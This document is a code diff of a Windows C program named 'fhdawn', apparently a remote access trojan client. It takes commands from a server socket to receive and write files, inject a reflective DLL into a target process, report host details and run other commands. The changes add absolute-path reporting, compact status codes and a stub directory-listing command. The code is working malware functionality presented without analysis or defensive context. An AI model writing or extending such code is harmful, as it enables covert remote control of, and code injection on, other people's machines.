@@ -6,6 +6,7 @@ Modified: -
 */
 
 #include "fhdawn.h"
+#include "FileTunnel.h"
 #include "LoadLibraryR.h"
 
 int fsize = 0;
@@ -87,7 +88,7 @@ void fhdawn_main(void)
             int expected = 0; // expected bytes of size
             DWORD dwBytesWritten = 0; // number of bytes written
             BOOL write; // Return value of WriteFile();
-            
+            char* absolutePath[500];
             memset(temp, '\0', BUFFER); // Clear temp
             memset(fileinfo, '\0', 2);
             int return_code = recv(sockfd, temp, BUFFER, 0); // Receive File information from server (filename:filesize)
@@ -128,7 +129,15 @@ void fhdawn_main(void)
                 }
                 else {
                     // sockprintf(sockfd, "\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
-                    sockprintf(sockfd, "\n[ Saved File : %s ]\n[ File Size : %i bytes ]\n", fileinfo[0], total);
+                    // sockprintf(sockfd, "\n[ Saved File : %s ]\n[ File Size : %i bytes ]\n", fileinfo[0], total);
+                    GetAbsolutePath(fileinfo[0], absolutePath);
+                    sockprintf(
+                        sockfd,
+                        "F_OK:%s:%i:%s",
+                        fileinfo[0],
+                        total,
+                        absolutePath
+                    );
                 }
                 CloseHandle(recvfile);
             }
@@ -189,7 +198,7 @@ void fhdawn_main(void)
                     BREAK_WITH_ERROR("Failed to inject the DLL");
 
                 WaitForSingleObject(hModule, -1);
-                sockprintf(sockfd, "Successfully Injected Reflective DLL at PID %ld\n", dwProcessId);
+                sockprintf(sockfd, "DLL_OK:%ld", dwProcessId);
             } while (0);
 
             if (DLL)
@@ -259,11 +268,35 @@ void fhdawn_main(void)
             } while (upload);
             
         }
+        
         else if (strcmp(recvbuf, "fhdawn_host") == 0)
         {
             sockprintf(sockfd, "%s", UserPC());
         }
-
+        
+        else if (strcmp(recvbuf, "listdir") == 0)
+        {
+            WIN32_FIND_DATA data;
+            HANDLE hFind;
+            hFind = FindFirstFile("*", &data);  
+            if (hFind != INVALID_HANDLE_VALUE)
+            {
+                do {
+                   
+                    if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                        
+                    }
+                    else {
+                       
+                    }
+                } while (FindNextFile(hFind, &data));
+            }
+        } 
+        /*
+        else if (strcmp(recvbuf, "dlloutput") == 0)
+        {
+            sockSend(GetOutputData());
+        }*/
         else {
             ExecSock();
         }
